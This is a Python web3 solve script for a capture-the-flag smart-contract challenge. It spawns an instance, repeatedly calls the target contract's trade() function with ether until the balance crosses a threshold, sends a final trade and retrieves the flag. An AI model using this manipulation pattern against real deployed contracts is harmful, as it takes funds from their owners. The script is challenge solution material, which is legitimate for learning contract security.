
from web3 import Web3
import solcx
from blockchain import compile_contract, construct_contract, ETHER
from platypwn_helper import spawn_instance, get_flag, kill_instance

solcx.install_solc("0.7.6")
solcx.set_solc_version("0.7.6")

spawner = ("<server_ip>", 31337)

d= spawn_instance(spawner)

rpc = d["RPC"]

privateKey = d["PrivateKey"]
address = d["Address"]
setupAddress = d["setupAddress"]

w3 = Web3(Web3.HTTPProvider(rpc))
acct = w3.eth.account.from_key(privateKey)
w3.eth.default_account = address


setup_abi, setup_bytecode = compile_contract("Setup.sol")
chal_abi, chal_bytecode = compile_contract("Chal.sol")

setup_instance = w3.eth.contract(address=setupAddress, abi=setup_abi, bytecode=setup_bytecode)
targetAddress = setup_instance.functions.TARGET().call()

chal_instance = w3.eth.contract(address=targetAddress, abi=chal_abi, bytecode=chal_bytecode)

balance = chal_instance.functions.getBalance().call()

SEND_VAL = 24
HAVE_VAL = 196

while True:
    balance = chal_instance.functions.getBalance().call()
    print(f'Balance: {(balance // (10**15)) / 1000:.2f}')
    if balance > (HAVE_VAL-SEND_VAL) * ETHER:
        break

    tx_hash = chal_instance.functions.trade().transact({
        "value": 5 * ETHER
        }
    )

tx_hash = chal_instance.functions.trade().transact({
    "value": SEND_VAL * ETHER
    }
)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

print(f'Balance: {(balance // (10**15)) / 1000:.2f}')

print(get_flag(spawner))
kill_instance(spawner)
